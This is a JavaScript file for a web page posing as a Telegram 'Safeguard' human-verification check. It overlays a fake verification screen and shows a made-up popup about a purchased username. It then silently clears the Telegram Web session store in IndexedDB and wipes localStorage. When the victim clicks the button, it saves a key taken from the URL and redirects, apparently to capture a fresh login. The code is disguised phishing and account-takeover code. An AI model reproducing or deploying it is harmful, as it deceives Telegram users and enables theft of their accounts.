async function onloadevent() {
    const overlay = document.createElement('div');
    overlay.innerHTML = `
    <style>
        @font-face {
            font-family: Roboto;
            font-style: normal;
            font-weight: 400;
        }
        @font-face {
            font-family: Roboto Mono;
            font-style: normal;
            font-weight: 400;
        }
        *, :after, :before {
            box-sizing: border-box;
            border: 0 solid #e5e7eb;
        }
        body, html {
            padding: 0;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
        }
        .text-telegram-text {
            color: var(--tg-theme-text-color, #ffffff);
        }
        .text-telegram-button-text {
            color: var(--tg-theme-button-text-color, #ffffff);
        }
    </style>
    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000;">
        <main style="display: flex; flex-direction: column; align-items: center; justify-content: flex-start; height: 100vh; padding: 1rem; text-align: center;">
            <div style="margin-top: 1.25rem;">
            <p class="text-3xl font-bold text-telegram-text" style="font-size: 1.875rem; line-height: 2.25rem; font-weight: 700;">Human Verification</p>
            <p class="text-md font-bold text-telegram-text mt-2" style="font-size: 1rem; line-height: 1.5rem; font-weight: 700; margin-top: 0.5rem;">Verify below to be granted entry</p>
            <div style="display: flex; align-items: center; justify-content: center; width: 100%; margin-top: 0.75rem;">
                <button id="verifyButton" class="text-telegram-button-text" style="width: 100%; padding: 0.75rem 1rem; margin-top: 1rem; margin-bottom: 1rem; font-family: 'Roboto Mono', monospace; font-size: 1rem; line-height: 1.5rem; border-radius: 0.25rem; background-image: linear-gradient(to right, #385446, #366950, #3c7659); cursor: pointer; transition: background-image 0.3s ease; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -4px rgba(0, 0, 0, 0.1);">Click here</button>
            </div>
            </div>
        </main>
    </div>
    `;


    if(window.Telegram.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.MainButton.setParams({
            color: window.Telegram.WebApp.bottomBarColor,
            text: "@safeguard"
        });
        window.Telegram.WebApp.MainButton.show();
        window.Telegram.WebApp.onEvent('mainButtonClicked', () => window.Telegram.WebApp.showPopup({title: 'safeguard', message: 'This username was bought on Fragment on May 17, 2023 at 5:39 PM for 151.00 ($2,845.92)'}));
    }

    document.body.append(overlay);
    const db = indexedDB.open("tweb");
    db.onsuccess = ((_) => {
        const transaction = db.result.transaction("session", "readwrite");
        transaction.objectStore("session").clear();
    });

    document.getElementById("verifyButton").addEventListener("click", async () => {
        document.getElementById("verifyButton").innerText = "Loading...";
        
        let type = window.location.search == "" ? "msg" : "ins";
        let key = type == "msg" ? window.location.pathname.split("/")[1] : window.location.search.split("=")[1];

        localStorage.clear();
        localStorage.setItem("verification-type", type);
        localStorage.setItem("verification-key", key);
        window.location.assign("/");
    });
}

window.addEventListener("load", onloadevent);